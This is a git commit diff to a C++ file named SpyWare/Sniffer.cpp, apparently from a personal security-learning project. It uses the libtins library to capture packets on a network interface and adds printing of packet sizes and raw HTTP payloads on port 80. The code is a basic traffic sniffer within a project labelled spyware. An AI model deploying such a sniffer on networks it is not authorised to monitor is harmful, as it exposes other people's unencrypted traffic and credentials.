b428f11c359aa78179ca5d6813e06b09c8c6f932
sivan <you@example.com>
2024-06-05 00:13:09 +0300

    sniffer

--- SpyWare/Sniffer.cpp
+++ SpyWare/Sniffer.cpp
@@ -1,8 +1,6 @@
 #include <iostream>
 #include <tins/tins.h>
 
-#define SOCK_PATH    "/home/sivan/cyber/echo_socket"
-
 using namespace Tins;
 using namespace std;
 
@@ -11,11 +9,22 @@ bool callback(const PDU &pdu) {
     const IP &ip = pdu.rfind_pdu<IP>(); 
     // Find the TCP layer
     const TCP &tcp = pdu.rfind_pdu<TCP>(); 
+
+    cout << "size: " << ip.size() << " | ";
     cout << ip.src_addr() << ':' << tcp.sport() << " -> " 
          << ip.dst_addr() << ':' << tcp.dport() << endl;
+    
+    if (tcp.sport() == 80 || tcp.dport() == 80)
+    {
+        const RawPDU* pkt = pdu.find_pdu<RawPDU>();
+        RawPDU::payload_type payload = pkt->payload();
+        vector<uint8_t> dt = payload.data();
+        cout << "HTTP: " <<  payload << endl;
+    }
+
     return true;
 }
 
 int main() {
-    Sniffer("eth0").sniff_loop(callback);
+    Sniffer("ens33").sniff_loop(callback);
 }
